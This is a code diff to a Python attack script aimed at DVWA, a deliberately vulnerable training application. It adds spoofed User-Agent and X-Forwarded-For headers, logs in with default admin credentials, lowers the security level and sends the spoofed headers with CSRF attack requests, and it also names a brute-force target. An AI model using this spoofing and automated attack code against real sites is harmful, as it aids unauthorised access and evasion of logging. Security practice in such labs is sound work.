@@ -25,9 +25,36 @@ delay = delays.get(request_rate, 'medium')
 csrf_url = f"{base_url}/vulnerabilities/csrf/"
 login_url = f"{base_url}/login.php"
 
+# Headers to spoof User-Agent and IP address
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+    'X-Forwarded-For': '192.168.1.1'
+}
+# Construct the target URL for brute force attacks
+target_url = f"{base_url}/vulnerabilities/brute/"
+login_url = f"{base_url}/login.php"
+security_url = f"{base_url}/security.php"
+
 def login_and_setup_security():
-    # Existing login logic here
-    pass
+    #response = session.get(login_url)
+    data = {
+        'username': 'admin',
+        'password': 'password',
+        'Login': 'Login',
+    }
+    response = session.post(login_url, data=data, headers=headers)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
+    time.sleep(delay) 
+    
+    #response = session.get(security_url)
+    data = {
+        'security': 'low',
+        'seclev_submit': 'Submit',
+        'user_token': user_token
+    }
+    session.post(security_url, data=data, headers=headers)
+    time.sleep(delay) 
 
 def csrf_attack():
     total_tests = 0
@@ -48,7 +75,7 @@ def csrf_attack():
         'user_token': user_token
     }
     total_tests += 1
-    post_response = session.post(csrf_url, data=data)
+    post_response = session.post(csrf_url, data=data, headers=headers)
     response_code = post_response.status_code
     success_condition = (200 <= response_code < 300)
 
